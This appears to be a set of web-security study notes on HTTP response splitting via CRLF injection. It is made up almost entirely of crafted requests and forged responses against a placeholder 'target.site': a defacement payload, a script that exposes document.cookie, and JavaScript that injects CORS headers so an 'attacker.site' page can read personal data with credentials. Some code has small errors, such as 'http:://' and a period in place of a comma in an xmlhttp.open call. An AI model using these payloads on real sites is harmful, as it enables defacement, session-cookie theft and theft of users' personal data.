#### CR = %0d #

#### LF = %0a #

GET http:://target.site/trackUrl.php?url=<http://elsfoo.com>

---

HTTP Response

HTTP/1.1 200 OK

Content-Length: 0

Content-Type: text/html

Set-cookie: lastUrl = <http://elsfoo.com>

---

GET http:://target.site/trackUrl.php?url=<http://elsfoo.com%0d%0aHTTP/1.1%20200%20OK%0d%0aContent%2dType:%20text/html%0d%0aContent%2dLength:%2028%0d%0a%0d%0a><html><h1>Defaced</h1></html>
---

HTTP Response

HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/html
Set-cookie: lastUrl = <http://elsfoo.com>
[CRLF]
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 28
[CRLF]
<html><h1>Defaced</h1></html>

---

XSS through HTTP response splitting

GET http:://target.site/trackUrl.php?url=<http://elsfoo.com%0d%0aHTTP/1.1%20200%20OK%0d%0aContent%2dType:%20text/html%0d%0aContent%2dLength:%2039%0d%0a%0d%0a><script>alert(document.cookie)</script>

---

HTTP Response

HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/html
Set-cookie: lastUrl = <http://elsfoo.com>
[CRLF]
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 39
[CRLF]
<script>alert(document.cookie)</script>

---

Bypassing Same Origin Policy

<script>

function loadXMLDoc()
{
  var xmlhttp;
  xmlhttp = new XMLHttpRequest();
  xmlhttp.withCredentials = true;
  xmlhttp.onreadystatechange = function()
  {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
    {
      document.getElementById("responseDiv").innerHTML = xmlhttp.responseText;
    }
  }

  xmlhttp.open("GET"."http://target.site/getPersonalData.php?trackingUrl=test%0d%0aAccess-Control-Allow-Origin:%20http://attacker.site%0d%0aAccess-Control-Allow-Credentials:%20true", true);
  xmlhttp.send();

}

</script>
